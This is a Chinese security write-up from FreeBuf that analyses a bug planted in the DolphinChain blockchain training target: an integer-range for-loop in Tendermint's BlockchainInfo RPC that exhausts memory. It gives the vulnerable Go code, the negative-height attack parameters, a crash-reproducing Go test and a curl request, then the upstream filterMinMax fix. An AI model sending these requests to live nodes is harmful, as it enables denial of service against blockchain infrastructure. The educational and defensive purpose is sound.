@@ -1,0 +1,166 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+# ![liner-background
+-withlogo.png](https://image.3001.net/images/20190425/1556175456_5cc15a60690ad.png!small)
+**海豚靶机链（DolphinChain）的上线得到了广大安全人员、开发者的支持，在此表示玄猫对大家表示感谢！现在我们将逐一公布我们在靶机链上设置的的缺陷漏洞，帮助大家更好的了解区块链链安全。事不宜迟，本次我们开始第一期漏洞的分析。**
+
+##  **关** **于DolphinChain**
+
+DolphinChain 是由玄猫安全实验室维护的区块链应用靶机，旨在教授区块链应用程序安全课程。您可以使用 DolphinChain 进行安装和练习。  
+
+DolphinChain 基于 tendermint v0.31.2 (WARNING: ALPHA SOFTWARE) 开发，是当时的
+tendermint 最新版本。
+
+在这个版本里(v1.0.0)，我们在DolphinChain设置了10多个缺陷。任何白帽子与区块链开发者都可以尝试挖掘漏洞。DolphinChain目的在于帮助安全人员提高技能，同时帮助区块链开发者更好地了解保护区块链应用程序的过程。
+
+ **项目官网：**<http://dolphinchain.org/>
+
+ **项目地址：**<https://github.com/XuanMaoSecLab/DolphinChain>
+
+ **漏洞标签**  
+
+RPC For-loop OOM  
+
+**漏洞描述**  
+
+这是一个来自 hackerone 提交的关于 RPC 的漏洞。恶意的 BlockchainInfo 请求可能会导致无限循环，最终导致内存耗尽导致崩溃。  
+
+**漏洞分析**  
+
+文件：rpc/core/blocks.go  
+
+    
+    
+    func BlockchainInfo(ctx *rpctypes.Context, minHeight, maxHeight int64) (*ctypes.ResultBlockchainInfo, error) {
+    if minHeight == 0 {
+    minHeight = 1
+    }
+    if maxHeight == 0 {
+    maxHeight = blockStore.Height()
+    } else {
+    maxHeight = cmn.MinInt64(blockStore.Height(), maxHeight)
+    }
+    // maximum 20 block metas
+    const limit int64 = 20
+    minHeight = cmn.MaxInt64(minHeight, maxHeight-limit)
+    logger.Debug("BlockchainInfoHandler", "maxHeight", maxHeight, "minHeight", minHeight)
+    if minHeight > maxHeight {
+    return nil, fmt.Errorf("min height %d can't be greater than max height %d", minHeight, maxHeight)
+    }
+    blockMetas := []*types.BlockMeta{}
+    for height := maxHeight; height >= minHeight; height-- { // for-loop
+    blockMeta := blockStore.LoadBlockMeta(height)
+    blockMetas = append(blockMetas, blockMeta)
+    }
+    return &ctypes.ResultBlockchainInfo{blockStore.Height(), blockMetas}, nil
+    }
+
+攻击者可以发送如下参数值：
+
+    
+    
+    minHeight = -9223372036854775808 (min int64)
+    maxHeight = -9223372036854775788 (minHeight + 20)
+
+注意到maxHeight = cmn.MinInt64(blockStore.Height(), maxHeight)，其中 MinInt64
+为从两个参数选择较小的，所以我们使用负值的 maxHeight。
+
+注意循环语句 for height := maxHeight; height >= minHeight; height-- {}，代码中的 for-loop
+会可以无限次循环执行。当达到循环次数 9223372036854775807 (max int64) ，还能继续进行。每次无法查找块时，它会向
+blockMetas 向量追加一个nil。最终，这将增长到足以耗尽服务器上的内存。
+
+ **复现或测试步骤**  
+
+此处可以有两种复现方式。
+
+使用 go test 脚本测试
+
+    
+    
+    // XuanMao : Bug test
+    func TestBlockchainInfoForloop(t *testing.T) {
+    config := cfg.ResetTestRoot("node_node_test")
+    defer os.RemoveAll(config.RootDir)
+    // create & start node
+    n, err := DefaultNewNode(config, log.TestingLogger())
+    require.NoError(t, err)
+    err = n.Start()
+        require.NoError(t, err)
+        
+    c := struct {
+    min, max     int64
+    }{
+    -9223372036854775808, -9223372036854775788,
+    }
+    BlockchainInfo(c.min,c.max)
+    }
+
+![1.png](https://image.3001.net/images/20190425/1556175909_5cc15c2576196.png!small)
+
+可以看到内存持续上升，几分钟后程序 crash.
+
+启动节点复现  
+
+开启一个节点，并向节点接口(e.g. 127.0.0.1:26657)，发送以下请求：
+
+    
+    
+    curl 'http:///blockchain?minHeight=-9223372036854775808&maxHeight=-9223372036854775788'
+
+##  **修复**
+
+本漏洞相关修复见 : Fix
+
+本漏洞在版本 v0.22.6 中修复。
+
+ **修复方法：**
+
+增加 filterMinMax 对输入的参数值进行检查处理。
+
+> 检查参数值不小于0；
+>
+> min 小于 max；
+>
+> 当 min 为 0 时，设置为 1 ，当 max 为 0 ，设置为最后区块高度。
+    
+    
+    // error if either min or max are negative or min < max
+    // if 0, use 1 for min, latest block height for max
+    // enforce limit.
+    // error if min > max
+    func filterMinMax(height, min, max, limit int64) (int64, int64, error) {
+    // filter negatives
+    if min < 0 || max < 0 {
+    return min, max, fmt.Errorf("heights must be non-negative")
+    }
+    // adjust for default values
+    if min == 0 {
+    min = 1
+    }
+    if max == 0 {
+    max = height
+    }
+    // limit max to the height
+    max = cmn.MinInt64(height, max)
+    // limit min to within `limit` of max
+    // so the total number of blocks returned will be `limit`
+    min = cmn.MaxInt64(min, max-limit+1)
+    if min > max {
+    return min, max, fmt.Errorf("min height %d can't be greater than max height %d", min, max)
+    }
+    return min, max, nil
+    }
+    
+      
+    
+
+## 相关代码
+
+参考漏洞代码：<https://github.com/tendermint/tendermint/blob/v0.22.5/rpc/core/blocks.go>
+
+本漏洞相关 Issue 见 : <https://github.com/tendermint/tendermint/issues/2049>
+
+fix：<https://github.com/tendermint/tendermint/commit/8dc655dad25b0b04f271cb66ba73fd504db3195d>
+
+ ***本文作者：BUGX，转载请注明来自FreeBuf.COM。**
+
